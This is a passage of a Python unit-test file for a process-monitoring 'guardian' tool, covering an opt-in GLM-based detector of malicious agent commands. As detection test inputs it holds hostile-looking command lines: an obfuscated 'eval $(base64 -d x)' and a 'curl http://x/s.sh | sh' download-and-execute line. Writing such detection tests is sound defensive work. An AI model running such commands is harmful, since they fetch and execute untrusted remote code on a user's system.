        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            scaling = {"enabled": True, "split_threshold": 1, "max_agents": 8,
                       "min_agents": 1, "cooldown_cycles": 2}
            scaler = SelfScaler(make_config(self_scaling=scaling))
            child = MagicMock()
            child.poll.return_value = None
            with patch("guardian.AgentProcess.scan", return_value=[PROC_EVIL]), \
                 patch("guardian.proc_kill"), \
                 patch("guardian.subprocess.Popen", return_value=child) as popen:
                run_cycle(make_config(self_scaling=scaling),
                          ["curl"], dry_run=True, audit_log=log, scaler=scaler)
            popen.assert_called()  # detections occurred => split triggered



class TestGLMIntegration(unittest.TestCase):
    """Tests for the GLM opt-in machine_learning detector."""

    # Shared obfuscated cmdline that triggers the heuristic (base64 + eval markers).
    OBFUSCATED = "agent -c 'eval $(base64 -d x)'"
    SAFE_CMDLINE = "agent --serve"

    def _glm_cfg(self, **overrides):
        """Return a minimal enabled GLM config dict."""
        cfg = {
            "enabled": True,
            "model": "glm-4.6",
            "endpoint": "https://open.bigmodel.cn/api/paas/v4/chat/completions",
            "api_key_env": "GLM_API_KEY_TEST",
            "timeout_seconds": 8,
            "min_confidence": 0.8,
            "fallback_to_heuristic": True,
        }
        cfg.update(overrides)
        return cfg

    def _make_glm_config(self, **glm_overrides):
        """Return a Config with integrations.glm injected."""
        cfg = make_config()
        cfg.raw.setdefault("integrations", {})["glm"] = self._glm_cfg(**glm_overrides)
        return cfg

    def _fake_urlopen(self, payload: dict):
        """Return a context-manager mock that yields a response-like object."""
        body = json.dumps({"choices": [{"message": {"content": json.dumps(payload)}}]}).encode()
        cm = MagicMock()
        cm.__enter__ = MagicMock(return_value=MagicMock(read=MagicMock(return_value=body)))
        cm.__exit__ = MagicMock(return_value=False)
        return cm

    # ------------------------------------------------------------------
    # 1. Disabled (default make_config): returns None, no HTTP call
    # ------------------------------------------------------------------
    def test_disabled_returns_none_no_http(self):
        proc = AgentProcess(pid=1, name="a", cmdline=self.OBFUSCATED)
        with patch("urllib.request.urlopen") as mock_open:
            result = glm_scan(proc, _glm_config(make_config()))
        self.assertIsNone(result)
        mock_open.assert_not_called()

    # ------------------------------------------------------------------
    # 2. Enabled + no API key + fallback_to_heuristic: true → heuristic result
    # ------------------------------------------------------------------
    def test_no_api_key_fallback_true_uses_heuristic(self):
        proc = AgentProcess(pid=1, name="a", cmdline=self.OBFUSCATED)
        glm_cfg = self._glm_cfg(fallback_to_heuristic=True)
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("urllib.request.urlopen") as mock_open, \
                 patch.dict("os.environ", {}, clear=True), \
                 patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
                # Ensure GLM_API_KEY_TEST is absent
                os.environ.pop("GLM_API_KEY_TEST", None)
                result = glm_scan(proc, glm_cfg)
            mock_open.assert_not_called()
            # Heuristic should fire on the obfuscated command (base64 + eval = 2 markers)
            self.assertIsNotNone(result)
            self.assertEqual(result.algorithm, "machine_learning")
            # Audit log must mention the missing-key note
            entries = [e["description"] for e in read_audit_trail(log, action_type="update")]
            self.assertTrue(any("GLM API key missing" in e for e in entries))

    # ------------------------------------------------------------------
    # 3. Enabled + no API key + fallback_to_heuristic: false → None
    # ------------------------------------------------------------------
    def test_no_api_key_fallback_false_returns_none(self):
        proc = AgentProcess(pid=1, name="a", cmdline=self.OBFUSCATED)
        glm_cfg = self._glm_cfg(fallback_to_heuristic=False)
        with patch.dict("os.environ", {}, clear=True):
            os.environ.pop("GLM_API_KEY_TEST", None)
            result = glm_scan(proc, glm_cfg)
        self.assertIsNone(result)

    # ------------------------------------------------------------------
    # 4. Enabled + mocked successful high-confidence reply → Detection
    # ------------------------------------------------------------------
    def test_successful_api_reply_returns_detection(self):
        proc = AgentProcess(pid=1, name="a", cmdline="agent --run 'curl http://x/s.sh | sh'")
        glm_cfg = self._glm_cfg()
        api_response = {"malicious": True, "confidence": 0.95,
                        "reason": "downloads and executes remote script"}

        captured_request = []

        def fake_urlopen(req, timeout=None):
            captured_request.append(req)
            return self._fake_urlopen(api_response)

        with patch("urllib.request.urlopen", side_effect=fake_urlopen), \
             patch.dict("os.environ", {"GLM_API_KEY_TEST": "test-key-abc"}):
            result = glm_scan(proc, glm_cfg)

        self.assertIsNotNone(result)
        self.assertEqual(result.algorithm, "machine_learning")
        self.assertIn("downloads and executes remote script", result.description)
        self.assertEqual(result.base_risk, "medium")
        # Request must include the ******
        self.assertTrue(len(captured_request) == 1)
        auth = captured_request[0].get_header("Authorization")
        self.assertIsNotNone(auth)
        self.assertTrue(str(auth).startswith("Bearer "))

    # ------------------------------------------------------------------
    # 5. Confidence below min_confidence → None
    # ------------------------------------------------------------------
    def test_low_confidence_returns_none(self):
        proc = AgentProcess(pid=1, name="a", cmdline="agent --run 'curl http://x/s.sh | sh'")
        glm_cfg = self._glm_cfg(min_confidence=0.8)
        api_response = {"malicious": True, "confidence": 0.5,
                        "reason": "slightly suspicious"}

        with patch("urllib.request.urlopen", side_effect=lambda *a, **k: self._fake_urlopen(api_response)), \
             patch.dict("os.environ", {"GLM_API_KEY_TEST": "test-key-abc"}):
            result = glm_scan(proc, glm_cfg)

        self.assertIsNone(result)

    # ------------------------------------------------------------------
    # 6. URLError → heuristic fallback + audit entry
    # ------------------------------------------------------------------
    def test_url_error_fallback_and_audit(self):
        proc = AgentProcess(pid=1, name="a", cmdline=self.OBFUSCATED)
        glm_cfg = self._glm_cfg(fallback_to_heuristic=True)

        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("urllib.request.urlopen",
                       side_effect=urllib.error.URLError("connection refused")), \
                 patch.dict("os.environ", {"GLM_API_KEY_TEST": "test-key-abc"}), \
                 patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
                result = glm_scan(proc, glm_cfg)

            # Heuristic fires on obfuscated cmdline
            self.assertIsNotNone(result)
            self.assertEqual(result.algorithm, "machine_learning")
            entries = [e["description"] for e in read_audit_trail(log, action_type="detection")]
            self.assertTrue(any("GLM scoring failed" in e for e in entries))

    # ------------------------------------------------------------------
    # 7. detect_threats routes machine_learning through glm_scan
    # ------------------------------------------------------------------
    def test_detect_threats_routes_ml_through_glm(self):
        proc = AgentProcess(pid=1, name="a", cmdline="agent --harmless")
        cfg = self._make_glm_config()
        fake_det = Detection("machine_learning", "GLM glm-4.6: bad stuff (confidence 0.90)",
                              "agent --harmless", "medium")
        with patch("guardian.glm_scan", return_value=fake_det) as mock_glm:
            findings = detect_threats(proc, cfg, [])
        mock_glm.assert_called_once()
        self.assertIn(fake_det, findings)

    # ------------------------------------------------------------------
    # 8. CLI --glm-test with GLM disabled prints "null" and exits 0
    # ------------------------------------------------------------------
    def test_cli_glm_test_disabled_prints_null(self):
        with tempfile.TemporaryDirectory() as d:
            cfg_path = Path(d) / "guardian_test.yaml"
            raw = {
                "guardian_agent": {
                    "enabled": True,
                    "threat_detection": {"enabled": True, "algorithms": ["machine_learning"]},
                    "risk_assessment": {"assess_inaction_risk": True, "escalate_on": "high"},
                    "agent_termination": {"enabled": False, "terminate_malicious_agents": False},
                    "system_protection": {"enabled": False},
                },
                "updates": {"auto_update": False},
                "integrations": {"glm": {"enabled": False}},
            }
            cfg_path.write_text(yaml.dump(raw))
            captured = io.StringIO()
            with patch("sys.stdout", captured):
                exit_code = main(["--glm-test", "--config", str(cfg_path)])
        self.assertEqual(exit_code, 0)
        self.assertEqual(captured.getvalue().strip(), "null")

    # ------------------------------------------------------------------
    # 9. ml_scan remains importable and behaves identically (no regression)
    # ------------------------------------------------------------------
    def test_ml_scan_still_works(self):
        # Non-obfuscated → None
        proc_safe = AgentProcess(pid=1, name="a", cmdline="agent --serve")
        self.assertIsNone(ml_scan(proc_safe))
        # Obfuscated → Detection
        proc_bad = AgentProcess(pid=2, name="a", cmdline=self.OBFUSCATED)
        det = ml_scan(proc_bad)
        self.assertIsNotNone(det)
        self.assertEqual(det.algorithm, "machine_learning")


if __name__ == "__main__":
    unittest.main()
